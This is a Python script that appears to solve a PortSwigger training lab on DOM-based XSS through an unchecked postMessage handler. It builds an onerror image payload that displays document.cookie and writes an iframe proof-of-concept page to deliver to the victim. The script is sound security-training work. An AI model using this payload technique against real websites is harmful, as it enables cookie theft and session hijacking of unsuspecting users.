"""
Lab 1: DOM XSS using web messages
https://portswigger.net/web-security/dom-based/web-message-manipulation/lab-dom-xss-using-web-messages
Difficulty: Practitioner

📝 The flaw: the page's postMessage handler writes event.data directly into
innerHTML with no origin check and no sanitization. Any page (ours) can
message it raw HTML/JS.

Goal: alert(document.cookie) in the victim's session.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns, build_postmessage_poc

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Checking for the telltale unsafe pattern: addEventListener('message'")
    note("...) feeding straight into innerHTML with no event.origin check.")
    grep_for_patterns(source, ["addEventListener('message'", ".innerHTML", "event.origin"])

    payload = "<img src=1 onerror=alert(document.cookie)>"
    message_js_literal = f"'{payload}'"  # raw string, not JSON — matches the flaw

    html = build_postmessage_poc(iframe_src=f"{TARGET}/", message_payload=message_js_literal)

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")
    note("Host on the exploit server and Deliver to victim.")


if __name__ == "__main__":
    run()
